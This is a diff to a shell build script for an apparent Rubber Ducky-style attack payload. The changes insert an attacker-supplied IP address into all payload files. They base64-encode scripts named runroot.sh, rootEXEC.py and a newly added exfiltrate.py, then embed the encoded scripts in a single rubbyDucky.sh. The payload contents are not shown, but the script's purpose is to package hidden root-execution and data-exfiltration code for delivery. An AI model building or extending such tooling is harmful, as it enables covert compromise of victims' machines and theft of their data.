@@ -7,16 +7,26 @@ rm -rf build
 mkdir build
 cd build
 
+cp $duckyPath/* .
 
-base64 -w 0 $duckyPath/runroot.sh > runroot.txt
-base64 -w 0 $duckyPath/rootEXEC.py > py.txt
+# replace <REPLACE_IP> with ip.txt 
+sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" runroot.sh
+sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" rubbyDucky.sh
 
-cp $duckyPath/rubbyDucky.sh .
+# replace all <REPLACE_IP> in all files in build dir
+find . -type f -exec sed -i "s/<REPLACE_IP>/$(cat ../builder/ip.txt)/g" {} \;
+
+
+base64 -w 0 runroot.sh > runroot.txt
+base64 -w 0 rootEXEC.py > py.txt
+base64 -w 0 exfiltrate.py > exfiltrate.txt
+
 # {RUNROOT_BASE64} in rubbyDucky.sh will be replaced with runroot.txt
 # {PY_BASE64} in rubbyDucky.sh will be replaced with py.txt
 
 sed -i "s/{RUNROOT_BASE64}/$(cat runroot.txt)/g" rubbyDucky.sh
 sed -i "s/{PY_BASE64}/$(cat py.txt)/g" rubbyDucky.sh
+sed -i "s/{EXFILTRATE_BASE64}/$(cat exfiltrate.txt)/g" rubbyDucky.sh
 
 echo "Created rubbyDucky.sh in build folder"
 
